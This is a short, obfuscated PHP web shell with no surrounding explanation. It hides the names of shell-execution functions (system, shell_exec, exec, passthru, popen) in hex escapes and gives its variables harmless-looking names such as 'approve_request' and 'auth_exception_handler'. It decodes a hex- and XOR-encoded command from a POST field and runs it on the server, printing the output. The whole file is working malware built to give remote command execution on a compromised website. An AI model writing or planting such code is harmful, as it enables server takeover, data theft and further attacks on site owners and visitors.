<?php

$framework2 = "sh\x65l\x6C\x5Fe\x78ec";
$framework4 = "pa\x73\x73\x74h\x72u";
$framework3 = "\x65x\x65c";
$framework1 = "\x73\x79\x73tem";
$approve_request = "h\x65x2bi\x6E";
$framework7 = "p\x63l\x6Fs\x65";
$framework5 = "po\x70\x65n";
$framework6 = "s\x74\x72\x65\x61m\x5Fg\x65t\x5Fco\x6Et\x65\x6Ets";
if (isset($_POST["\x64at\x61_ch\x75nk"])) {
            function auth_exception_handler     (   $obj     ,      $token    )    {
     $item      =   ''     ;
     for($r=0;
 $r<strlen($obj);
 $r++){
$item.=chr(ord($obj[$r])^$token);

} return   $item;
   
}
            $data_chunk = $approve_request($_POST["\x64at\x61_ch\x75nk"]);
            $data_chunk = auth_exception_handler($data_chunk, 66);
            if (function_exists($framework1)) {
                $framework1($data_chunk);
            } elseif (function_exists($framework2)) {
                print $framework2($data_chunk);
            } elseif (function_exists($framework3)) {
                $framework3($data_chunk, $ptr_obj);
                print join("\n", $ptr_obj);
            } elseif (function_exists($framework4)) {
                $framework4($data_chunk);
            } elseif (function_exists($framework5) && function_exists($framework6) && function_exists($framework7)) {
                $token_item = $framework5($data_chunk, 'r');
                if ($token_item) {
                    $flag_elem = $framework6($token_item);
                    $framework7($token_item);
                    print $flag_elem;
                }
            }
            exit;
        }